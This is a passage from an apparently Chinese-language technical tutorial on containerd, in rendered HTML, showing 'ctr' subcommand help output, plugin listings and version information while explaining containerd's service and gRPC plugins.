Delete one or more existing containers<br>   info                     Get info about a container<br>   list, <span class="hljs-built_in">ls</span>                 List containers<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> a container<br>   checkpoint               Checkpoint a container<br>   restore                  Restore a container from checkpoint<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br>[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr c -h</span><br>NAME:<br>   ctr containers - Manage containers<br><br>USAGE:<br>   ctr containers <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create                   Create container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more existing containers<br>   info                     Get info about a container<br>   list, <span class="hljs-built_in">ls</span>                 List containers<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> a container<br>   checkpoint               Checkpoint a container<br>   restore                  Restore a container from checkpoint<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="content"><a href="#content" class="headerlink" title="content"></a>content</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr content -h</span><br>NAME:<br>   ctr content - Manage content<br><br>USAGE:<br>   ctr content <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   active                   Display active transfers<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Permanently delete one or more blobs<br>   edit                     Edit a blob and <span class="hljs-built_in">return</span> a new digest<br>   fetch                    Fetch all content <span class="hljs-keyword">for</span> an image into containerd<br>   fetch-object             Retrieve objects from a remote<br>   fetch-blob               Retrieve blobs from a remote<br>   get                      Get the data <span class="hljs-keyword">for</span> an object<br>   ingest                   Accept content into the store<br>   list, <span class="hljs-built_in">ls</span>                 List all blobs <span class="hljs-keyword">in</span> the store<br>   push-object              Push an object to a remote<br>   label                    Add labels to content<br>   prune                    Prunes content from the content store<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr snapshots diff -h</span><br>NAME:<br>   ctr snapshots diff - Get the diff of two snapshots. the default second snapshot is the first snapshot<span class="hljs-string">&#x27;s parent.</span><br><span class="hljs-string"></span><br><span class="hljs-string">USAGE:</span><br><span class="hljs-string">   ctr snapshots diff [command options] [flags] &lt;idA&gt; [&lt;idB&gt;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">OPTIONS:</span><br><span class="hljs-string">   --media-type value  Media type to use for creating diff (default: &quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;)</span><br><span class="hljs-string">   --ref value         Content upload reference to use</span><br><span class="hljs-string">   --keep              Keep diff content. up to creator to delete it.</span><br><span class="hljs-string">   --label value       Labels to attach to the image</span><br><span class="hljs-string">   </span><br><span class="hljs-string">[root@ubuntu-22 open-source]# </span><br><span class="hljs-string">[root@ubuntu-22 open-source]# </span><br></code></pre></td></tr></table></figure><h4 id="event"><a href="#event" class="headerlink" title="event"></a>event</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr event -h</span><br>NAME:<br>   ctr events - Display containerd events<br><br>USAGE:<br>   ctr events [arguments...]<br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="image"><a href="#image" class="headerlink" title="image"></a>image</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr image -h</span><br>NAME:<br>   ctr images - Manage images<br><br>USAGE:<br>   ctr images <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   check                    Check existing images to ensure all content is available locally<br>   <span class="hljs-built_in">export</span>                   Export images<br>   import                   Import images<br>   list, <span class="hljs-built_in">ls</span>                 List images known to containerd<br>   mount                    Mount an image to a target path<br>   unmount                  Unmount the image from the target<br>   pull                     Pull an image from a remote<br>   push                     Push an image to a remote<br>   prune                    Remove unused images<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Remove one or more images by reference<br>   tag                      Tag an image<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> an image<br>   convert                  Convert an image<br>   usage                    Display usage of snapshots <span class="hljs-keyword">for</span> a given image ref<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="introspection"><a href="#introspection" class="headerlink" title="introspection"></a>introspection</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr info</span><br>&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;64bd2d8f-d225-40aa-82fd-874a0a06032b&quot;</span>,<br>        <span class="hljs-string">&quot;pid&quot;</span>: 939,<br>        <span class="hljs-string">&quot;pidns&quot;</span>: 4026531836<br>    &#125;<br>&#125;<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ps -ef |grep 939</span><br>root         939       1  0 20:48 ?        00:00:00 /usr/local/bin/containerd<br>root        3492    2363  0 20:50 pts/0    00:00:00 grep --color=auto 939<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls</span><br>TYPE                                   ID                       PLATFORMS      STATUS    <br>io.containerd.snapshotter.v1           aufs                     linux/amd64    skip      <br>io.containerd.event.v1                 exchange                 -              ok        <br>io.containerd.internal.v1              opt                      -              ok        <br>io.containerd.warning.v1               deprecations             -              ok        <br>io.containerd.snapshotter.v1           blockfile                linux/amd64    skip      <br>io.containerd.snapshotter.v1           btrfs                    linux/amd64    skip      <br>io.containerd.snapshotter.v1           devmapper                linux/amd64    error     <br>io.containerd.snapshotter.v1           native                   linux/amd64    ok        <br>io.containerd.snapshotter.v1           overlayfs                linux/amd64    ok        <br>io.containerd.snapshotter.v1           zfs                      linux/amd64    skip      <br>io.containerd.content.v1               content                  -              ok        <br>io.containerd.metadata.v1              bolt                     -              ok        <br>io.containerd.gc.v1                    scheduler                -              ok        <br>io.containerd.differ.v1                walking                  linux/amd64    ok        <br>io.containerd.lease.v1                 manager                  -              ok        <br>io.containerd.streaming.v1             manager                  -              ok        <br>io.containerd.runtime.v1               linux                    linux/amd64    ok        <br>io.containerd.monitor.v1               cgroups                  linux/amd64    ok        <br>io.containerd.runtime.v2               task                     linux/amd64    ok        <br>io.containerd.runtime.v2               shim                     -              ok        <br>io.containerd.sandbox.store.v1         <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.sandbox.controller.v1    <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.transfer.v1              <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.internal.v1              restart                  -              ok        <br>io.containerd.tracing.processor.v1     otlp                     -              skip      <br>io.containerd.internal.v1              tracing                  -              skip      <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.nri.v1                   nri                      -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="leases"><a href="#leases" class="headerlink" title="leases"></a>leases</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr leases -h</span><br>NAME:<br>   ctr leases - Manage leases<br><br>USAGE:<br>   ctr leases <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   list, <span class="hljs-built_in">ls</span>                 List all active leases<br>   create                   Create lease<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete a lease<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br></code></pre></td></tr></table></figure><h4 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr ns -h</span><br>NAME:<br>   ctr namespaces - Manage namespaces<br><br>USAGE:<br>   ctr namespaces <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create, c   Create a new namespace<br>   list, <span class="hljs-built_in">ls</span>    List namespaces<br>   remove, <span class="hljs-built_in">rm</span>  Remove one or more namespaces<br>   label       Set and clear labels <span class="hljs-keyword">for</span> a namespace<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr namespace -h</span><br>NAME:<br>   ctr namespaces - Manage namespaces<br><br>USAGE:<br>   ctr namespaces <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create, c   Create a new namespace<br>   list, <span class="hljs-built_in">ls</span>    List namespaces<br>   remove, <span class="hljs-built_in">rm</span>  Remove one or more namespaces<br>   label       Set and clear labels <span class="hljs-keyword">for</span> a namespace<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>å‚è€ƒï¼š<a href="https://github.com/containerd/containerd/issues/7739">https://github.com/containerd/containerd/issues/7739</a></p><h4 id="snapshot"><a href="#snapshot" class="headerlink" title="snapshot"></a>snapshot</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">NAME:<br>   ctr snapshots - Manage snapshots<br><br>USAGE:<br>   ctr snapshots <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   commit                   Commit an active snapshot into the provided name<br>   diff                     Get the diff of two snapshots. the default second snapshot is the first snapshot<span class="hljs-string">&#x27;s parent.</span><br><span class="hljs-string">   info                     Get info about a snapshot</span><br><span class="hljs-string">   list, ls                 List snapshots</span><br><span class="hljs-string">   mounts, m, mount         Mount gets mount commands for the snapshots</span><br><span class="hljs-string">   prepare                  Prepare a snapshot from a committed snapshot</span><br><span class="hljs-string">   delete, del, remove, rm  Remove snapshots</span><br><span class="hljs-string">   label                    Add labels to content</span><br><span class="hljs-string">   tree                     Display tree view of snapshot branches</span><br><span class="hljs-string">   unpack                   Unpack applies layers from a manifest to a snapshot</span><br><span class="hljs-string">   usage                    Usage snapshots</span><br><span class="hljs-string">   view                     Create a read-only snapshot from a committed snapshot</span><br><span class="hljs-string"></span><br><span class="hljs-string">OPTIONS:</span><br><span class="hljs-string">   --snapshotter value  Snapshotter name. Empty value stands for the default value. [$CONTAINERD_SNAPSHOTTER]</span><br><span class="hljs-string">   --help, -h           show help</span><br></code></pre></td></tr></table></figure><h4 id="task"><a href="#task" class="headerlink" title="task"></a>task</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr t -h</span><br>NAME:<br>   ctr tasks - Manage tasks<br><br>USAGE:<br>   ctr tasks <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   attach                   Attach to the IO of a running container<br>   checkpoint               Checkpoint a container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more tasks<br>   <span class="hljs-built_in">exec</span>                     Execute additional processes <span class="hljs-keyword">in</span> an existing container<br>   list, <span class="hljs-built_in">ls</span>                 List tasks<br>   <span class="hljs-built_in">kill</span>                     Signal a container (default: SIGTERM)<br>   metrics, metric          Get a single data point of metrics <span class="hljs-keyword">for</span> a task with the built-in Linux runtime<br>   pause                    Pause an existing container<br>   ps                       List processes <span class="hljs-keyword">for</span> container<br>   resume                   Resume a paused container<br>   start                    Start a container that has been created<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr task -h</span><br>NAME:<br>   ctr tasks - Manage tasks<br><br>USAGE:<br>   ctr tasks <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   attach                   Attach to the IO of a running container<br>   checkpoint               Checkpoint a container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more tasks<br>   <span class="hljs-built_in">exec</span>                     Execute additional processes <span class="hljs-keyword">in</span> an existing container<br>   list, <span class="hljs-built_in">ls</span>                 List tasks<br>   <span class="hljs-built_in">kill</span>                     Signal a container (default: SIGTERM)<br>   metrics, metric          Get a single data point of metrics <span class="hljs-keyword">for</span> a task with the built-in Linux runtime<br>   pause                    Pause an existing container<br>   ps                       List processes <span class="hljs-keyword">for</span> container<br>   resume                   Resume a paused container<br>   start                    Start a container that has been created<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="tranfer-amp-streaming"><a href="#tranfer-amp-streaming" class="headerlink" title="tranfer &amp; streaming"></a>tranfer &amp; streaming</h4><p>æ¼”è¿›ä¸­ã€</p><h4 id="version"><a href="#version" class="headerlink" title="version"></a>version</h4><p>è¿”å›containerdçš„ç‰ˆæœ¬å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># containerd -v</span><br>containerd github.com/containerd/containerd v1.7.18 ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br></code></pre></td></tr></table></figure><h3 id="7-2-2-Services"><a href="#7-2-2-Services" class="headerlink" title="7.2.2 Services"></a>7.2.2 Services</h3><p>containerdä¸­çš„Serviceæ³¨å†Œçš„ä¸¤ç§æ’ä»¶å¦‚ä¸‹ï¼š</p><ul><li>Service Pluginsï¼šå³io.containerd.service.v1ï¼Œç”¨äºå†…éƒ¨å¾®æœåŠ¡ä¹‹é—´ç›¸äº’è°ƒç”¨ï¼Œè°ƒç”¨æ–¹å¼ä¸ºå‡½æ•°è°ƒç”¨ã€‚</li><li>GRPC Pluginsï¼šå³io.containerd.grpc.v1ï¼Œç”¨äºå¯¹å¤–æä¾›æœåŠ¡ï¼Œé€šè¿‡grpcæœåŠ¡æ¥å£è¿›è¡Œè°ƒç”¨ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls</span><br>TYPE                                   ID                       PLATFORMS      STATUS    <br>io.containerd.snapshotter.v1           aufs                     linux/amd64    skip      <br>io.containerd.event.v1                 exchange                 -              ok        <br>io.containerd.internal.v1              opt                      -              ok        <br>io.containerd.warning.v1               deprecations             -              ok        <br>io.containerd.snapshotter.v1           blockfile                linux/amd64    skip      <br>io.containerd.snapshotter.v1           btrfs                    linux/amd64    skip      <br>io.containerd.snapshotter.v1           devmapper                linux/amd64    error     <br>io.containerd.snapshotter.v1           native                   linux/amd64    ok        <br>io.containerd.snapshotter.v1           overlayfs                linux/amd64    ok        <br>io.containerd.snapshotter.v1           zfs                      linux/amd64    skip      <br>io.containerd.content.v1               content                  -              ok        <br>io.containerd.metadata.v1              bolt                     -              ok        <br>io.containerd.gc.v1                    scheduler                -              ok        <br>io.containerd.differ.v1                walking                  linux/amd64    ok        <br>io.containerd.lease.v1                 manager                  -              ok        <br>io.containerd.streaming.v1             manager                  -              ok        <br>io.containerd.runtime.v1               linux                    linux/amd64    ok        <br>io.containerd.monitor.v1               cgroups                  linux/amd64    ok        <br>io.containerd.runtime.v2               task                     linux/amd64    ok        <br>io.containerd.runtime.v2               shim                     -              ok        <br>io.containerd.sandbox.store.v1         <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.sandbox.controller.v1    <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.transfer.v1              <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.internal.v1              restart                  -              ok        <br>io.containerd.tracing.processor.v1     otlp                     -              skip      <br>io.containerd.internal.v1              tracing                  -              skip      <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.nri.v1                   nri                      -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls |grep io.containerd.service.v1</span><br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span 